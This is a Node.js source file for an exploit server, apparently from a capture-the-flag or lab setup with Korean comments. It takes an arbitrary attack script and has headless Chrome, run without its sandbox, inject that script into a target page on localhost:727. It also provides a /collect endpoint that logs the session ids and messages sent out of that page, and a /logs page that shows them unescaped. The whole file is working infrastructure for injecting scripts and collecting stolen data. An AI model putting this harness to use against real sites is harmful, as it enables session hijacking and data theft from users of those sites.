// exploit/exploit_server.js

import express from "express";
import bodyParser from "body-parser";
import puppeteer from "puppeteer";
import path from "path";
import { fileURLToPath } from "url";
import cors from "cors";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cors({
    origin: ["http://localhost:727", "http://localhost:777"],
    credentials: true
}));

const logs = [];

app.all("/collect", (req, res) => {
    try {
        const msg = (req.query.msg || req.body.msg || "").toString();
        const sessionid = (req.body.sessionid || "").toString();
        console.log("[COLLECT]", { sessionid, msg });
        logs.push({ ts: Date.now(), sessionid, msg });
        return res.status(200).send("OK");
    } catch (e) {
        console.error("Collect error:", e);
        return res.status(500).send("Collect failed");
    }
});

app.post("/visit", async (req, res) => {
    const { exploitScript } = req.body;
    if (!exploitScript) return res.status(400).json({ error: "missing payload" });

    console.log("Payload received");

    let browser;
    try {
        browser = await puppeteer.launch({
            headless: "new",
            args: ["--no-sandbox", "--disable-dev-shm-usage"]
        });

        const ctx = await browser.createIncognitoBrowserContext();
        const page = await ctx.newPage();
        page.setDefaultNavigationTimeout(30000);

        // Secret 서버 페이지로 이동, DOM과 네트워크 모두 안정될 때까지 대기
        await page.goto(`http://localhost:727/`, { waitUntil: "networkidle2" });

        // socket.io 라이브러리 안전하게 추가
        await page.addScriptTag({ url: "https://cdn.socket.io/4.7.2/socket.io.min.js" });

        // JS 페이로드 안전하게 실행
        await page.evaluate((script) => {
            try {
                // DOM이 준비될 때까지 잠시 대기
                if (document.readyState !== "complete") {
                    window.addEventListener("load", () => {
                        try {
                            const el = document.createElement("script");
                            el.type = "text/javascript";
                            el.textContent = script;
                            document.body.appendChild(el);
                        } catch (innerErr) {
                            console.error("Inner payload error:", innerErr);
                        }
                    });
                } else {
                    const el = document.createElement("script");
                    el.type = "text/javascript";
                    el.textContent = script;
                    document.body.appendChild(el);
                }
            } catch (e) {
                console.error("Payload evaluate error:", e);
            }
        }, exploitScript);

        // /collect가 호출되는지 안전하게 기다림
        await page.waitForResponse(
            response => response.url().includes('/collect') && response.status() === 200,
            { timeout: 20000 }
        ).catch(() => console.log("No /collect response detected within timeout"));

        // WebSocket 이벤트가 충분히 발생할 시간을 줌
        await page.waitForTimeout(10000);

        await ctx.close();
        await browser.close();

        return res.json({ ok: true, hint: "GET /logs to see collected data" });
    } catch (e) {
        try { if (browser) await browser.close(); } catch {}
        console.error("Visit handler error:", e);
        return res.status(500).json({ error: e.message || String(e) });
    }
});

app.get("/exploit", (req, res) => {
    res.sendFile(path.join(__dirname, "exploit.html"));
});

app.get("/exploit.js", (req, res) => {
    res.sendFile(path.join(__dirname, "exploit.js"));
});

app.get("/logs", (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
        <meta charset="utf-8"><title>Exploit Server Logs</title>
        </head>
        <body>
            <h2>Exploit Server Logs</h2>
            <pre>
${logs.map(item => `${new Date(item.ts).toISOString()} [${item.sessionid}] "${item.msg}"`).join("\n") || "No logs yet."}
            </pre>
            <button onclick="location.reload()">Reload</button>
        </body>
        </html>
    `);
});

app.listen(777, "0.0.0.0", () => console.log("Exploit server running on 777"));
